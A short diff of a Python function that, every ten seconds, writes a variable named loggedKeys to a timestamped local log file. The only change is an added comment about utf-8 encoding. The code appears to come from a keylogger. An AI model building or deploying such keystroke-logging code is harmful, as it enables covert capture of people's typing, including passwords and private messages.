@@ -21,7 +21,7 @@ def send():
         time.sleep(10) # change if you want
         timenow = time.strftime("%d-%m-%Y_%H-%M-%S")
 
-        with open(f"log_{timenow}.txt", "w", encoding="utf-8") as f:
+        with open(f"log_{timenow}.txt", "w", encoding="utf-8") as f: #i recommend to use utf-8 because of the accented letters
             f.write(loggedKeys)
             f.close()
 
